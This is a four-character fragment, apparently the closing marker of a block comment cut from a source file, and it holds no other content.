 */
